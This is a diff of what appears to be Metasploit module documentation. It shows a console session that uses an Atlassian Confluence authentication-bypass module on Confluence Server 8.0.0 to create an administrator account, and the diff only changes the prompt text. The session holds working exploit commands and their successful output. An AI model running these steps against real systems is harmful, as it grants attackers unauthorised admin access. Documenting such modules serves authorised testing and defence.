@@ -35,14 +35,14 @@ E-mail to be used when creating a new user with admin privileges.
 ## Scenarios
 ### Tested on Confluence Server 8.0.0 with Linux target (Ubuntu 20.04)
 ```
-msf6 > use auxiliary/multi/http/atlassian_confluence_auth_bypass
-msf6 > auxiliary(admin/http/atlassian_confluence_auth_bypass) > set RHOSTS <YOUR_TARGET>
+msf > use auxiliary/multi/http/atlassian_confluence_auth_bypass
+msf > auxiliary(admin/http/atlassian_confluence_auth_bypass) > set RHOSTS <YOUR_TARGET>
 RHOSTS => <YOUR_TARGET>
-msf6 > auxiliary(admin/http/atlassian_confluence_auth_bypass) > set NEW_USERNAME admin_1337
+msf > auxiliary(admin/http/atlassian_confluence_auth_bypass) > set NEW_USERNAME admin_1337
 NEW_USERNAME => admin_1337
-msf6 > auxiliary(admin/http/atlassian_confluence_auth_bypass) > set NEW_PASSWORD admin_1337
+msf > auxiliary(admin/http/atlassian_confluence_auth_bypass) > set NEW_PASSWORD admin_1337
 NEW_PASSWORD => admin_1337
-msf6 > auxiliary(admin/http/atlassian_confluence_auth_bypass) > run
+msf > auxiliary(admin/http/atlassian_confluence_auth_bypass) > run
 [*] Running module against <YOUR_TARGET>
 
 [+] Admin user was created successfully. Credentials: admin_1337 - admin_1337
